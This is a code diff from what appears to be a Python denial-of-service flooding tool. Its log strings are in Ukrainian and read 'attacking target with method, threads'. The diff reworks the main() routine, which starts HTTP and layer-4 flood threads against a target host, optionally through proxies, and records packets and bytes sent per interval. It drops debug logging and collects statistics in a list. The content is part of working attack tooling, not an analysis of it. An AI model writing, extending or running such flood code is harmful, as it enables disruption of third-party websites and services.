@@ -1031,19 +1031,15 @@ class HttpFlood(Thread):
         if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
-def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, debug=False, refl_li_fn=None, text_to_print=None):
+def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, refl_li_fn=None, stats_output=[]):
     port = None
     url = None
     event = Event()
     event.clear()
     target = None
-    table = text_to_print is not None
 
     if method not in Methods.ALL_METHODS:
         exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
-
-    if debug:
-        logger.setLevel(logging.DEBUG)
 
     proxies = None
     if proxy_fn:
@@ -1109,16 +1105,11 @@ def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, debug=Fals
             Layer4((ip, port), ref, method, event,
                    proxies).start()
 
-    if not table:
-        logger.info(
-            f"{bcolors.WARNING}Атакуємо{bcolors.OKBLUE} %s{bcolors.WARNING} методом{bcolors.OKBLUE} %s{bcolors.WARNING}, потоків:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
-            % (target or url.host, method, threads))
-
     event.set()
     ts = time()
 
     while time() < ts + timer:
-        args = (
+        stats_output.append((
             target or url.host,
             port or (url.port or 80),
             method,
@@ -1126,16 +1117,11 @@ def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, debug=Fals
             Tools.humanformat(int(REQUESTS_SENT)),
             Tools.humanbytes(int(BYTES_SEND)),
             round((time() - ts) / timer * 100, 2),
-        )
-        if table:
-            text_to_print.append(f'%s,%s,%s,%s,%s,%s,%d%%' % args)
-        else:
-            logger.debug(f'{bcolors.WARNING}Ціль:{bcolors.OKBLUE} %s,{bcolors.WARNING} Порт:{bcolors.OKBLUE} %s,{bcolors.WARNING} Метод:{bcolors.OKBLUE} %s{bcolors.WARNING} Потоків:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
-                         args)
+        ))
         REQUESTS_SENT.set(0)
         BYTES_SEND.set(0)
 
-        sleep(3)
+        sleep(2)
 
     event.clear()
     exit()
